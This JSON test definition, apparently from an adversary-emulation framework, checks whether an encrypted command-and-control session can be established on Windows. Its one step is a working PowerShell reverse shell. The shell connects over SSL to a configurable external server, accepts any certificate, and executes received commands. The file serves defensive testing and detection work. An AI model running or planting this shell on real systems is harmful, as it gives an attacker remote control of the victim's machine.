{
  "id": "21caf58e-87ad-440c-a6b8-3ac259964003",
  "name": "OpenSSL C2",
  "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "af77591b-828b-4087-9f06-b56f13d2abb2",
      "type": "execute-command",
      "data": {
        "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '\u003e ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2\u003e\u00261;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [],
  "tags": [
    "T1573"
  ],
  "input_arguments": [
    {
      "name": "server_ip",
      "type": "string",
      "description": "IP of the external server",
      "value": "127.0.0.1"
    },
    {
      "name": "server_port",
      "type": "string",
      "description": "The port to connect to on the external server",
      "value": "443"
    }
  ]
}